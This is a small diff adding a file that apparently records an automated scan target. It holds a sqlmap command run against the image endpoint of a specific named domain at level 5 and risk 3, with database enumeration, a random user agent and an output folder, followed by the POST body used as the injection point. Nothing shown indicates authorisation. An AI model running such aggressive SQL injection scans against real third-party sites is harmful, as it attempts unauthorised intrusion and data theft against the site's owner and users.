@@ -1,0 +1,3 @@
+https://www.infinitycapital.bh/_next/image (POST)  # /usr/bin/sqlmap -u https://www.infinitycapital.bh/_next/image --data=url=/x.jpg&w=1080&q=75 --batch --level=5 --risk=3 --dbs --threads=4 --random-agent --output-dir=tool_outputs/sqli_img
+
+url=/x.jpg&w=1080&q=75
